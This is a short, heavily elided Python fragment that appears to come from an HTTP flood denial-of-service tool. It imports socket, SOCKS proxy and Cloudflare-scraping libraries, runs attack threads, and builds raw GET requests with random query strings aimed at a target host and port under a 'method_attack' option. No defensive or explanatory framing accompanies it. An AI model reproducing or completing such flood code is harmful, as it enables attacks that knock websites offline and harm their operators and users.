import os, sys, requests, urllib3, socket, socks, threading, random, re, os, sys, glob, time, requests, ssl, webbrowser, bz2, datetime, wget, json, cfscrape, urllib3
...
class Home(threading.Thread):
    ...
    def run(self):
        ...
        if method_attack == '1':
            ...
            get_host = 'GET /?=' + str(random.randint(0, 200000)) + ' HTTP/1.1\r\nHost: ' + host_url + ':' + str(port) + '\r\n'
